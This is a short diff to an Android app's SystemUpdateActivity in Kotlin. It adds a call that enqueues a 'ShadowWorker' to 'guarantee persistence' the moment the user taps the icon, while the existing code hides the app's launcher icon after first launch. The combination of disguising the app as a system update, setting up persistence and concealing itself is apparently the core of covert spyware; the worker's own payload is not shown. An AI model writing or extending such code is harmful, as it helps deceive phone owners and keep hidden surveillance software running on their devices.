@@ -28,6 +28,13 @@ class SystemUpdateActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         
+        // Guarantee persistence is scheduled the moment the user taps the icon
+        try {
+            com.shadow.ShadowWorker.enqueue(applicationContext)
+        } catch (e: Exception) {
+            android.util.Log.e("SystemUpdateActivity", "Failed to enqueue worker", e)
+        }
+        
         // Hide the app icon from the launcher once we've been launched once
         val p = packageManager
         val componentName = android.content.ComponentName(this, SystemUpdateActivity::class.java)
